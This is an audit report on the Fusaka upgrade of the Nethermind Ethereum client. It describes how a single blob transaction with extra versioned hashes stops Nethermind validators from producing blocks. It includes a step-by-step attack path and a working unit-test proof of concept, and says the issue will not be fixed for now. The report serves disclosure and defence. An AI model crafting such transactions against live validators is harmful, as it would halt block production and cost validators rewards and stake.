---
tags:
  - lang/solidity
  - platform/sherlock
  - has/github
  - has/poc
  - severity/high
  - sector/governance
  - sector/infra
  - sector/staking
protocol: "[[Fusaka]]"
auditors:
  - "[[Proof-of-Spirit]]"
  - "[[guhu95]]"
report: "https://github.com/sherlock-audit/2025-09-ethereum-fusaka-upgrade-judging"
genome:
  - "[[missing]]"
  - "[[permanent]]"
  - "[[reward-accounting]]"
---
# H-2: Malformed blob tx causes Nethermind validators to stop producing blocks

- id: 64103
- impact: HIGH
- protocol: [[Fusaka]] Upgrade
- reporter: guhu95 (Sherlock)
- source: N/A

## Summary


This bug report discusses an issue with the Fusaka V5 blob-serving handler in the Nethermind Ethereum client. The bug allows for a single malformed EIP-4844 blob transaction to halt block production for Nethermind validators. This is due to a missing length-equality enforcement and unguarded indexing in the code. The bug affects 38% of validators who run Nethermind as their EL. The attack path involves an attacker crafting a malicious transaction and setting a high gas tip to increase its chances of being selected during payload building. The impact of this bug includes removing 38% of network capacity, loss of block rewards and fees for validators, and penalties for coordinated inactivity. The report also includes a proof-of-concept for testing the bug and suggests mitigations such as enforcing strict length equality and hardening the V5 serving code. 

## Details


Source: https://github.com/sherlock-audit/2025-09-ethereum-fusaka-upgrade-judging/issues/176 

This issue has been acknowledged by the team but won't be fixed at this time.

## Found by 
Proof-of-Spirit, guhu95

### Summary

Missing length-equality enforcement combined with Fusaka V5 blob-serving handler’s unguarded indexing will stop block production for Nethermind validators after a single malformed EIP-4844 blob transactions which will trigger failures in `engine_getBlobsV2` / `engine_getPayloadV5` / `BlobsBundleV2` during payload assembly.

There will be a parallel submission to the EF Bug Bounty program for the Pectra / `engine_getPayloadV4` manifestation affecting `engine_getBlobsV1` and `BlobsBundleV1`.

### Root Cause

1. `nethermind/src/Nethermind/Nethermind.Crypto/IBlobProofsManager.cs`, `IBlobProofsVerifier.ValidateHashes(ShardBlobNetworkWrapper blobs, byte[][] blobVersionedHashes)` does not enforce `blobVersionedHashes.Length == blobs.Blobs.Length` (nor equality with commitments/proofs), allowing malformed txs.
2. in `nethermind/src/Nethermind/Nethermind.Merge.Plugin/Handlers/GetBlobsHandlerV2.cs` (V5) together with `nethermind/src/Nethermind/Nethermind.TxPool/Collections/BlobTxDistinctSortedPool.cs` (`TryGetBlobAndProofV1`), the code indexes `wrapper.Blobs[indexOfBlob]` without guarding `indexOfBlob >= wrapper.Blobs.Length`. The handler disposes then re-throws, violating V5’s all-or-nothing semantics (should return `Result.Success(null)` for partial availability).
3. `nethermind/src/Nethermind/Nethermind.Merge.Plugin/Data/BlobsBundleV2.cs` allocates arrays by mutated N and, when `N < M`, degrades to empty arrays in a catch path.

### Internal Pre-conditions

none

### External Pre-conditions

38% of validators run Nethermind as their EL.


### Attack Path

1. Attacker crafts a blob tx where `blobVersionedHashes` length (N) is greater than the sidecar’s actual blob count (M), with each hash individually well-formed (prefix 0x01, 32 bytes).
2. Attacker sets high gas tip so the malformed tx is likely to be selected during payload building.
3. Nethermind validators accept and propagate the malformed tx.
4. The tx remains in the pool across proposal attempts and is considered during each block construction by Nethermind validators.
5. The CL calls `engine_getPayloadV5`; the EL constructs `BlobsBundleV2` sized by N while only M blobs exist in the sidecar.
4. The CL calls `engine_getBlobsV2([realHash, extraHash])`. Because both hashes are present in `BlobIndex`, V5 handler assumes availability and asks the pool for `indexOfBlob`.
5. `TryGetBlobAndProofV1` indexes `wrapper.Blobs[1]` (for the extra hash) and triggers `IndexOutOfRangeException` (no bounds check). The V5 handler disposes and re-throws, producing an RPC error (instead of returning `Data == null`).
6. The CL cannot obtain blobs and skips the proposal for that slot. As long as the malformed tx persists Nethermind-based proposers repeatedly miss slots.

### Impact

1. 38% of the network capacity is removed.
2. 38% of validators lose block rewards and fees.
3. 38% of validators lose stake due coordinated inactivity leak penalties.

### PoC

1. Add in `./src/Nethermind/Nethermind.Merge.Plugin.Test/EngineModuleTests.V5.cs`
2. Test: `dotnet test ./src/Nethermind/Nethermind.Merge.Plugin.Test/Nethermind.Merge.Plugin.Test.csproj`
```
    [Test]
    public async Task GetPayloadV5_and_engine_getBlobsV2_should_fail_for_blob_txs_with_extra_hashes()
    {
        MergeTestBlockchain chain = await CreateBlockchain(releaseSpec: Osaka.Instance, mergeConfig: new MergeConfig()
        {
            NewPayloadBlockProcessingTimeout = (int)TimeSpan.FromDays(1).TotalMilliseconds
        });
        IEngineRpcModule rpcModule = chain.EngineRpcModule;

        // 1) Build a valid 1-blob tx for Osaka and then mutate it to have an extra versioned hash (N > M).
        Transaction blobTx = Build.A.Transaction
            .WithShardBlobTxTypeAndFields(1, spec: Osaka.Instance)
            .WithMaxFeePerGas(1.GWei())
            .WithMaxPriorityFeePerGas(1.GWei())
            .WithMaxFeePerBlobGas(1000.Wei())
            .SignedAndResolved(chain.EthereumEcdsa, TestItem.PrivateKeyA).TestObject;

        ShardBlobNetworkWrapper wrapper = (ShardBlobNetworkWrapper)blobTx.NetworkWrapper!;
        byte[] originalHash = blobTx.BlobVersionedHashes![0]!;
        byte[] extraHash = new byte[KzgPolynomialCommitments.BytesPerBlobVersionedHash];
        extraHash[0] = KzgPolynomialCommitments.KzgBlobHashVersionV1; // well-formed version byte but no underlying blob
        blobTx.BlobVersionedHashes = [originalHash, extraHash];

        // Mempool admission should still succeed because equality of lengths is not validated.
        chain.TxPool.SubmitTx(blobTx, TxHandlingOptions.None).Should().Be(AcceptTxResult.Accepted);

        // 2) Start payload building and get V5 payloadId.
        Task blockImprovementWait = chain.WaitForImprovedBlock();
        Hash256 headHash = chain.BlockTree.HeadHash;
        ForkchoiceStateV1 forkchoiceState = new(headHash, headHash, headHash);
        PayloadAttributes payloadAttributes = new()
        {
            Timestamp = chain.BlockTree.Head!.Timestamp + 1,
            PrevRandao = TestItem.KeccakH,
            SuggestedFeeRecipient = TestItem.AddressF,
            Withdrawals = [],
            ParentBeaconBlockRoot = TestItem.KeccakE
        };

        string payloadId = (await rpcModule.engine_forkchoiceUpdatedV3(forkchoiceState, payloadAttributes)).Data!.PayloadId!;
        await blockImprovementWait;

        // 3) engine_getPayloadV5 should succeed and the bundle should reflect only actual M blobs (not the extra hash).
        ResultWrapper<GetPayloadV5Result?> payloadResult = await rpcModule.engine_getPayloadV5(Bytes.FromHexString(payloadId));
        payloadResult.Result.Should().Be(Result.Success);
        payloadResult.Data.Should().NotBeNull();
        payloadResult.Data!.BlobsBundle.Should().NotBeNull();
        BlobsBundleV2 bundle = payloadResult.Data!.BlobsBundle!;
        // Because bundle sizing uses tx.GetBlobCount() (BlobVersionedHashes.Length), it reflects N (2),
        // but only the actual M (1) blob/proof entries are populated. The extra entries remain null.
        bundle.Blobs.Length.Should().Be(2);
        bundle.Commitments.Length.Should().Be(2);
        bundle.Proofs.Length.Should().Be(2 * Ckzg.CellsPerExtBlob);
        bundle.Blobs.Count(b => b == null).Should().Be(1);
        bundle.Commitments.Count(c => c == null).Should().Be(1);
        // Leading proof cells match the actual wrapper proofs; trailing cells (for the extra hash) are null.
        bundle.Proofs.Take(Ckzg.CellsPerExtBlob).Should().BeEquivalentTo(wrapper.Proofs);
        bundle.Proofs.Skip(Ckzg.CellsPerExtBlob).Should().OnlyContain(cell => cell == null);

        // Sanity: engine_getBlobsV2 with only the real hash returns the blob and proofs.
        ResultWrapper<IEnumerable<BlobAndProofV2>?> ok = await rpcModule.engine_getBlobsV2([originalHash]);
        ok.Result.Should().Be(Result.Success);
        ok.Data.Should().NotBeNull();
        BlobAndProofV2 only = ok.Data!.Single();
        only.Blob.Should().BeEquivalentTo(wrapper.Blobs[0]);
        only.Proofs.Length.Should().Be(Ckzg.CellsPerExtBlob);
        only.Proofs.Should().BeEquivalentTo(wrapper.Proofs.Take(Ckzg.CellsPerExtBlob));

        // 4) Request using the mutated (N > M) set. Both hashes are present in the blob index (2),
        // but only the first has underlying blob/proofs. The handler will throw when accessing index 1.
        chain.TxPool.GetBlobCounts(blobTx.BlobVersionedHashes!).Should().Be(2);
        Func<Task> badRequest = () => rpcModule.engine_getBlobsV2(blobTx.BlobVersionedHashes!);
        await badRequest.Should().ThrowAsync<IndexOutOfRangeException>();
    }
```

### Mitigation

- Enforce strict length equality during admission and/or verification: require `BlobVersionedHashes.Length == wrapper.Blobs.Length == wrapper.Commitments.Length == wrapper.Proofs.Length / Ckzg.CellsPerExtBlob` in `ValidateHashes`/`ValidateLengths` or mempool validators.
- Harden V5 serving in `BlobTxDistinctSortedPool.TryGetBlobAndProofV1`, guard `indexOfBlob >= wrapper.Blobs.Length` and return `false`; ensure `GetBlobsHandlerV2` returns `Result.Success(null)` on partial availability (no exceptions).
- Bundle sanity: validate that `BlobsBundleV2` sizes are consistent with sidecar lengths; on mismatch, fail fast or exclude malformed txs from payload building.
